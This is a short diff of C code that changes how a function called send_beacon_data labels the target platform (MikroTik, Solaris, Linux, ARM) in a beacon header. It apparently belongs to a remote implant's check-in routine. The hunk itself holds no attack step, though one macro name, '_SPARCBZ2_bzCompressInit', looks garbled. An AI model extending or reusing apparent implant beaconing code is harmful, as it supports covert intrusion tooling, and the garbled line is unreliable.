@@ -322,22 +322,31 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	//Populate Beacon Header
 #if defined MIKROTIK
 	#if defined _PPC
-	bhdr.os = htons(MIKROTIK_PPC);
-	#elif defined _MIPSBE
-	bhdr.os = htons(MIKROTIK_MIPSBE);
-	#elif defined _MIPSLE
-	bhdr.os = htons(MIKROTIK_MIPSLE);
+		bhdr.os = htons(BH_MIKROTIK_PPC);
+	#elif defined _MIPS
+		bhdr.os = htons(BH_MIKROTIK_MIPS);
+	#elif defined _MIPSEL
+		bhdr.os = htons(BH_MIKROTIK_MIPSEL);
 	#elif defined _X86
-	bhdr.os = htons(MIKROTIK_X86);
+		bhdr.os = htons(BH_MIKROTIK_X86);
 	#endif
+
 #elif defined SOLARIS
 	#if defined _SPARCBZ2_bzCompressInit
-	bhdr.os = htons(SOLARIS_SPARC);
+		bhdr.os = htons(BH_SOLARIS_SPARC);
 	#elif defined _X86
-	bhdr.os = htons(SOLARIS_X86);
+		bhdr.os = htons(BH_SOLARIS_X86);
 	#endif
+
 #elif defined LINUX
-	bhdr.os = htons(LINUX_X86);
+	#if defined _X86
+		bhdr.os = htons(BH_LINUX_X86);
+	#elif defined _X86_64
+		bhdr.os = htons(BH_LINUX_X86_64);
+	#endif
+
+#elif defined ARM
+	bhdr.os = htons(BH_ARM);
 #endif
 
 	//TODO: Change this number whenever the version changes.
